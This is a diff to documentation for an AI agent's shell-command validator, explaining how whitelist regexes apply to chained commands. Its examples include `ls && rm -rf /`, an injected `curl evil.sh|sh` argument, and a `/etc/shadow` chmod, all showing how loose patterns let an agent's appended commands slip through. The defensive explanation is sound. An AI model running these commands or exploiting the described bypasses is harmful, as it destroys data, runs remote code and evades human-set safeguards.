@@ -119,17 +119,43 @@ whitelist:
 
 #### How It Works
 
-- Patterns are regex, matched against the start of the command string (like `re.match()`)
+- Patterns are regex, matched against the start of a **single command** (like `re.match()`)
 - A match bypasses ALL rule checks — the command is allowed unconditionally
-- For a **chained** command (`a; b`, `a && b`, `a | b`), a prefix match is not enough: each
-  segment is validated on its own unless a pattern spans the *entire* command. `^ls\b`
-  allows `ls -la`, but `ls; rm -rf /` is still BLOCKED on the `rm`
 - User whitelist patterns merge with built-in whitelist patterns from the plugin
 - Invalid regex patterns are skipped with a warning (won't crash the validator)
 
+A command **line** with several commands in it (`a && b`, `a; b`, `a | b`) is checked one
+command at a time, and your pattern is applied to each command separately. It is not enough
+for your pattern to match the front of the line — `^ls` does not whitelist `ls && rm -rf /`,
+it whitelists the `ls`, and the `rm -rf /` is still judged on its own.
+
+To whitelist a whole pipeline as one unit, **write the separator into the pattern** and anchor
+it end to end:
+
+```yaml
+whitelist:
+  # Whitelists this pipeline as a whole; `gh auth token` alone stays blocked.
+  - ^gh\s+auth\s+token\s*\|\s*docker\s+login\s+ghcr\.io\s+-u\s+[A-Za-z0-9._@-]+\s+--password-stdin$
+```
+
+Your pattern is then held to the number of commands it declared. That entry writes one
+separator, so it speaks for exactly two commands; if the line turns out to hold three, the
+entry does not cover it and every command is judged on its own. This matters because a loose
+slot such as `\S+` happily matches a `;` — had the user slot above been `\S+`,
+`-u foo;curl evil.sh|sh;true` would satisfy the pattern end to end, and counting is what
+refuses it.
+
+Write the pipeline on one line or several, as you like: a newline after `|` or `&&` is a
+continuation, not an extra command, and is counted as such.
+
+A pattern with no `|`, `&` or `;` in it is read as describing one command, and will never
+clear a multi-command line on its own — that is deliberate, and it is what stops a broad
+entry silently vouching for whatever an agent appends to it.
+
 #### Writing Good Patterns
 
-Whitelist patterns use prefix matching (anchored at the start, not the end). Write patterns specific enough to avoid unintended matches:
+Whitelist patterns match from the start of a command and, unless you anchor them, run to
+whatever follows. Write patterns specific enough to avoid unintended matches:
 
 ```yaml
 # GOOD: Specific command with anchored end
@@ -144,17 +170,22 @@ whitelist:
 whitelist:
   - ^gcloud
 
-# BAD: anchored but greedy — ".*" swallows "; rm -rf /", so the pattern spans
-# "npm run build; rm -rf /" end to end and whitelists the whole chain
+# BAD: anchored but greedy — ".*" accepts any arguments at all, so the "$" pins
+# nothing (it cannot clear a chained command, since it writes no separator)
 whitelist:
   - ^npm\s+run\s+.*$
 ```
 
-`$` alone does not make a pattern safe for chained commands. A pattern that must span a whole command has to spell out the characters it accepts (e.g. `[\w./:-]+`) rather than use `.*` or `\S+`, which match `;`, `&`, `|` and `${IFS}` happily.
+Use `$` at the end when you want to match the exact command. Without `$`, the pattern matches
+any command that starts with the pattern text — including extra arguments you did not intend
+to allow, so `^chmod\s+[0-7]{3}\s+/tmp/` also clears `chmod 755 /tmp/x /etc/shadow`.
 
-Spelling out separators is not enough for a path or host slot: `[\w./:-]+` still accepts `..` and `host.evil.com`. Pin a host literally and reject `.` / `..` segments; the built-in `rm -rf` and `gh auth token` entries in `00_whitelist.yaml` show the shape.
+Spell out the characters each slot accepts (e.g. `[\w./:-]+`) rather than using `.*` or `\S+`,
+which match `;`, `&`, `|`, `>` and `${IFS}` happily.
 
-Use `$` at the end when you want to match the exact command. Without `$`, the pattern matches any command that starts with the pattern text.
+Excluding separators is not enough for a path or host slot: `[\w./:-]+` still accepts `..` and
+`host.evil.com`. Pin a host literally and reject `.` / `..` segments; the built-in `rm -rf` and
+`gh auth token` entries in `00_whitelist.yaml` show the shape.
 
 #### Security: User-Level Only
 
